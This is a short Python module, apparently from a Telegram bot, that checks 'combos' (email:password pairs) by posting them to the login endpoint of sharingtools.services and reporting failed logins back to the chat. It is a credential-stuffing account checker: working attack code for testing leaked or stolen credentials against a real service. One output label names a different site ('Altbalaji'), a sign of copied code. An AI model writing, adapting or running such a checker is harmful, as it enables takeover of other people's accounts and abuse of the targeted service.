import requests
from  bs4 import BeautifulSoup
from message import Editmessage, Sendmessage, logger

head = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
}

def sharingtools_helper(chat_id, combo):
    status = Sendmessage(chat_id, '<i>Checking...</i>')
    try:
        combo_split = combo.split(':')
        inpumail = combo_split[0]
        inpupass = combo_split[1]
    except IndexError:
        return Editmessage(chat_id, 'Enter Valid Combo😡😡', status)
    action= 'login'   
    email= f'"username":"{inpumail}"'
    password = f'"password":"{inpupass}"'
    session_request = requests.Session()
    url = 'https://www.sharingtools.services/login'
    payload = '{%s,%s}' %(email, password)
    response = session_request.post(url, data=payload)
    result = response.json()
    if response.status_code != 200:
        state=result['status']
        code=result['code']
        messg = result['message']
        text = f'<b>Bad Combo ❌</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: {state}\nCode: {code}\nMessage: {messg}\nSite: Altbalaji</b>'
        Editmessage(chat_id, text, status)
        return
